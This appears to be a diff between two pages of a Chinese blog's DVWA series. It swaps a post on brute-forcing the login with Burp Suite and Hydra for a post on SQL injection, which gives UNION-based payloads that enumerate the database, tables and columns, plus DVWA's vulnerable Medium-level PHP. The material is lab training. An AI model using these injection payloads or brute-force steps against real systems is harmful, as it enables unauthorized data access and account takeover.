@@ -99,21 +99,22 @@
   };
 </script>
 
-  <meta name="description" content="工具： Burpsuite wireshark Hydra 分析首页登录过程 首页的登录界面是一个标准的表单提交过程，提交的方法是 POST。但是分析网页结构可以发现，它包含一个隐藏的 input元素。 发起点击行为随便输入用户密码后，点击提交。主要的交互过程如下： 123456789Request（POST）：    Login	Login    password	test    user_to">
+  <meta name="description" content="Low  判断是否有注入 1&amp;#39; or &amp;#39;12&amp;#39;=&amp;#39;12   注入成功后，猜字段数  1′ or 1=1 order by 1 # 1′ or 1=1 order by 2 # 1′ or 1=1 order by 3 #  order by 3执行失败，说明这个查询语句只查了两个字段。  获取当前数据库  1′ union select 1,database() #">
 <meta name="keywords" content="安全 DVWA">
 <meta property="og:type" content="article">
-<meta property="og:title" content="DVWA（一）密码爆破登录">
-<meta property="og:url" content="http://yoursite.com/2019/06/24/DVWA（一）密码爆破登录/index.html">
+<meta property="og:title" content="DVWA（五）SQL Injection">
+<meta property="og:url" content="http://yoursite.com/2019/06/28/DVWA(五）SQL Injection/index.html">
 <meta property="og:site_name" content="楚河">
-<meta property="og:description" content="工具： Burpsuite wireshark Hydra 分析首页登录过程 首页的登录界面是一个标准的表单提交过程，提交的方法是 POST。但是分析网页结构可以发现，它包含一个隐藏的 input元素。 发起点击行为随便输入用户密码后，点击提交。主要的交互过程如下： 123456789Request（POST）：    Login	Login    password	test    user_to">
+<meta property="og:description" content="Low  判断是否有注入 1&amp;#39; or &amp;#39;12&amp;#39;=&amp;#39;12   注入成功后，猜字段数  1′ or 1=1 order by 1 # 1′ or 1=1 order by 2 # 1′ or 1=1 order by 3 #  order by 3执行失败，说明这个查询语句只查了两个字段。  获取当前数据库  1′ union select 1,database() #">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092222.png">
-<meta property="og:image" content="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092231.png">
-<meta property="og:updated_time" content="2019-07-27T09:28:45.188Z">
+<meta property="og:image" content="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092348.png">
+<meta property="og:image" content="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092351.png">
+<meta property="og:image" content="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092357.png">
+<meta property="og:updated_time" content="2019-07-27T09:29:53.357Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="DVWA（一）密码爆破登录">
-<meta name="twitter:description" content="工具： Burpsuite wireshark Hydra 分析首页登录过程 首页的登录界面是一个标准的表单提交过程，提交的方法是 POST。但是分析网页结构可以发现，它包含一个隐藏的 input元素。 发起点击行为随便输入用户密码后，点击提交。主要的交互过程如下： 123456789Request（POST）：    Login	Login    password	test    user_to">
-<meta name="twitter:image" content="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092222.png">
+<meta name="twitter:title" content="DVWA（五）SQL Injection">
+<meta name="twitter:description" content="Low  判断是否有注入 1&amp;#39; or &amp;#39;12&amp;#39;=&amp;#39;12   注入成功后，猜字段数  1′ or 1=1 order by 1 # 1′ or 1=1 order by 2 # 1′ or 1=1 order by 3 #  order by 3执行失败，说明这个查询语句只查了两个字段。  获取当前数据库  1′ union select 1,database() #">
+<meta name="twitter:image" content="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092348.png">
 
 
 
@@ -121,7 +122,7 @@
 
   
   
-  <link rel="canonical" href="http://yoursite.com/2019/06/24/DVWA（一）密码爆破登录/">
+  <link rel="canonical" href="http://yoursite.com/2019/06/28/DVWA(五）SQL Injection/">
 
 
 
@@ -132,7 +133,7 @@
 </script>
 
   
-  <title>DVWA（一）密码爆破登录 | 楚河</title>
+  <title>DVWA（五）SQL Injection | 楚河</title>
   
 
 
@@ -289,7 +290,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/24/DVWA（一）密码爆破登录/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/28/DVWA(五）SQL Injection/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -306,7 +307,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">DVWA（一）密码爆破登录
+          <h1 class="post-title" itemprop="name headline">DVWA（五）SQL Injection
 
               
             
@@ -332,7 +333,7 @@
                 
               
 
-              <time title="Created: 2019-06-24 12:00:00" itemprop="dateCreated datePublished" datetime="2019-06-24T12:00:00+08:00">2019-06-24</time>
+              <time title="Created: 2019-06-28 12:00:00" itemprop="dateCreated datePublished" datetime="2019-06-28T12:00:00+08:00">2019-06-28</time>
             </span>
           
 
@@ -347,7 +348,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-27 17:28:45" itemprop="dateModified" datetime="2019-07-27T17:28:45+08:00">2019-07-27</time>
+                <time title="Modified: 2019-07-27 17:29:53" itemprop="dateModified" datetime="2019-07-27T17:29:53+08:00">2019-07-27</time>
               </span>
             
           
@@ -381,27 +382,43 @@
       
 
       
-        <p>工具： <code>Burpsuite</code> <code>wireshark</code> <code>Hydra</code></p>
-<h3 id="分析首页登录过程"><a href="#分析首页登录过程" class="headerlink" title="分析首页登录过程"></a>分析首页登录过程</h3><p><img src="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092222.png" alt="1553608887062"></p>
-<p>首页的登录界面是一个标准的表单提交过程，提交的方法是 <strong>POST</strong>。但是分析网页结构可以发现，它包含一个隐藏的 <code>input</code>元素。</p>
-<h4 id="发起点击行为"><a href="#发起点击行为" class="headerlink" title="发起点击行为"></a>发起点击行为</h4><p>随便输入用户密码后，点击提交。主要的交互过程如下：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Request（POST）：</span></span><br><span class="line">    Login	Login</span><br><span class="line">    password	test</span><br><span class="line">    user_token	2c8e253430ec4771e4d1cee142ea87d1</span><br><span class="line">    username	test</span><br><span class="line">    </span><br><span class="line">Response （302 FOUND） ：</span><br><span class="line">	<span class="attribute">Location</span>: login.php</span><br><span class="line">	<span class="attribute">null</span></span><br></pre></td></tr></table></figure>
+        <h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><p><img src="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092348.png" alt="1553822085578"></p>
+<ul>
+<li><p>判断是否有注入</p>
+<p><code>1&#39; or &#39;12&#39;=&#39;12</code></p>
+<p><img src="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092351.png" alt="1553822179218"></p>
+</li>
+<li><p>注入成功后，猜字段数</p>
+<ul>
+<li><code>1′ or 1=1 order by 1 #</code></li>
+<li><code>1′ or 1=1 order by 2 #</code></li>
+<li><code>1′ or 1=1 order by 3 #</code></li>
+</ul>
+<p><code>order by 3</code>执行失败，说明这个查询语句只查了两个字段。</p>
+</li>
+<li><p>获取当前数据库</p>
+<ul>
+<li>1′ union select 1,database() #</li>
+</ul>
+<p><img src="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092357.png" alt="1553822400568"></p>
+</li>
+<li><p>获取数据库中的表</p>
+<ul>
+<li><code>1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code></li>
+</ul>
+</li>
+<li><p>获取表中字段名</p>
+<ul>
+<li><code>1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_POST[ <span class="string">'id'</span> ]; </span><br><span class="line">    $id = mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = mysql_numrows( $result ); </span><br><span class="line">    $i   = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123; </span><br><span class="line">        <span class="comment">// Display values </span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> ); </span><br><span class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count </span></span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close(); </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>在每一次提交过程中，我们可以发现。<code>POST</code>的 <code>user_token</code>每次都发生改变。</p>
-<p>因此在进行爆破攻击时首先要分析页面获取到user_token的值，然后再进行提交。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 这是使用nodejs写的代码。运行需要一定的依赖包.</span><br><span class="line">words.map (<span class="function"><span class="params">word</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> user_token = $(<span class="string">"input.hidden"</span>).value</span><br><span class="line">    <span class="keyword">let</span> payload = &#123;<span class="attr">admin</span>: word.username, <span class="attr">password</span>: word.password, user.token=user_token&#125;</span><br><span class="line">    <span class="keyword">let</span> response = <span class="keyword">async</span> Request.get(payload)</span><br><span class="line">    <span class="keyword">if</span>(reponse.content.noinclude(<span class="string">'form'</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> word</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    	<span class="keyword">this</span>.ctx = response</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-
-<h3 id="无user-token暴力突破"><a href="#无user-token暴力突破" class="headerlink" title="无user_token暴力突破"></a>无<code>user_token</code>暴力突破</h3><h4 id="采用burpsuite进行突破"><a href="#采用burpsuite进行突破" class="headerlink" title="采用burpsuite进行突破"></a>采用burpsuite进行突破</h4><p>在配置好代理和SSL证书以后，将登录页面<code>vulnerabilities/brute/</code>加入到 <code>Intruder</code>中。</p>
-<p>设置好爆破字典payloads。</p>
-<p>直接使用<code>burpsuite</code>进行遍历。（使用较为简单，参考帮助文档即可）</p>
-<h4 id="使用hydra进行突破"><a href="#使用hydra进行突破" class="headerlink" title="使用hydra进行突破"></a>使用hydra进行突破</h4><p>hydra的密码测试速度极快。但是需要确保：</p>
-<ol>
-<li>登录时携带cookie</li>
-<li>设置cookie时第一个字母会被忽略</li>
-</ol>
-<p><img src="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092231.png" alt="1553782149835"></p>
-<p>命令如图所思， hydra携带参数默认以冒号进行分割。值得注意的是 <code>Cookie</code>的设置。</p>
-<p>在我大量分析包的时候发现，hydra在  <code>opensuse</code>环境下，会将 <code>cookie</code>的第一个字母进行忽略。</p>
+<p><code>mysql_real_escape_string</code>会对特殊字符进行转义，但是dvwa存在 <code>数字型注入</code>， 上述做法依然可以注入。（去掉单引号）</p>
+<h3 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h3><ul>
+<li>增加了跳转页面，防止sqlmap注入。手工难度与 <code>low</code>级别相似</li>
+</ul>
 
       
     </div>
@@ -445,14 +462,18 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2019/06/27/DVWA（四）文件上传/" rel="next" title="DVWA（四）文件上传漏洞">
+                <i class="fa fa-chevron-left"></i> DVWA（四）文件上传漏洞
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/06/25/DVWA（二）命令注入/" rel="prev" title="DVWA（二）命令注入">
-                DVWA（二）命令注入 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/07/27/http简介/" rel="prev" title="http简介">
+                http简介 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -575,7 +596,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析首页登录过程"><span class="nav-number">1.</span> <span class="nav-text">分析首页登录过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#发起点击行为"><span class="nav-number">1.1.</span> <span class="nav-text">发起点击行为</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无user-token暴力突破"><span class="nav-number">2.</span> <span class="nav-text">无user_token暴力突破</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#采用burpsuite进行突破"><span class="nav-number">2.1.</span> <span class="nav-text">采用burpsuite进行突破</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用hydra进行突破"><span class="nav-number">2.2.</span> <span class="nav-text">使用hydra进行突破</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low"><span class="nav-number">1.</span> <span class="nav-text">Low</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium级别"><span class="nav-number">2.</span> <span class="nav-text">Medium级别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High级别"><span class="nav-number">3.</span> <span class="nav-text">High级别</span></a></li></ol></div>
             
 
           </div>
